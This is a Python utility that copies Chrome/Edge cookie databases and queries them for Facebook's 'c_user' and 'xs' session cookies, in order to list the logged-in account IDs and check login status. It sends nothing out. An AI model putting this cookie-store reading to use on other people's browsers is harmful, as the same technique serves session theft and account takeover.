"""
Facebook Account Detector
Extracts Facebook account information from Chrome/Edge profiles
"""

import os
import json
import sqlite3
import shutil
from pathlib import Path


def get_facebook_accounts_from_profile(profile_path):
    """Extract Facebook account information from a browser profile"""
    facebook_accounts = []
    
    try:
        cookies_path = os.path.join(profile_path, 'Network', 'Cookies')
        if not os.path.exists(cookies_path):
            cookies_path = os.path.join(profile_path, 'Cookies')
        
        if not os.path.exists(cookies_path):
            return facebook_accounts
        
        temp_cookies = cookies_path + '.tmp'
        try:
            shutil.copy2(cookies_path, temp_cookies)
        except:
            return facebook_accounts
        
        try:
            conn = sqlite3.connect(temp_cookies)
            cursor = conn.cursor()
            
            query = """
                SELECT name, value, host_key 
                FROM cookies 
                WHERE host_key LIKE '%facebook.com%' 
                AND name IN ('c_user', 'xs')
                ORDER BY creation_utc DESC
            """
            
            cursor.execute(query)
            cookies = cursor.fetchall()
            
            user_ids = set()
            for cookie_name, cookie_value, host in cookies:
                if cookie_name == 'c_user':
                    user_ids.add(cookie_value)
            
            for user_id in user_ids:
                account_info = {
                    'id': user_id,
                    'name': f'Facebook Account (ID: {user_id})',
                    'email': None,
                    'selected': True
                }
                facebook_accounts.append(account_info)
            
            conn.close()
        finally:
            try:
                os.remove(temp_cookies)
            except:
                pass
                
    except Exception as e:
        print(f"Error extracting Facebook accounts: {e}")
    
    return facebook_accounts


def get_facebook_login_status(profile_path):
    """Quick check if Facebook is logged in for a profile"""
    try:
        cookies_path = os.path.join(profile_path, 'Network', 'Cookies')
        if not os.path.exists(cookies_path):
            cookies_path = os.path.join(profile_path, 'Cookies')
        
        if not os.path.exists(cookies_path):
            return False
        
        temp_cookies = cookies_path + '.tmp'
        try:
            shutil.copy2(cookies_path, temp_cookies)
        except:
            return False
        
        try:
            conn = sqlite3.connect(temp_cookies)
            cursor = conn.cursor()
            cursor.execute("SELECT COUNT(*) FROM cookies WHERE host_key LIKE '%facebook.com%' AND name = 'c_user'")
            count = cursor.fetchone()[0]
            conn.close()
            return count > 0
        finally:
            try:
                os.remove(temp_cookies)
            except:
                pass
    except:
        return False


if __name__ == '__main__':
    print("Facebook Account Detector - Standalone Test")
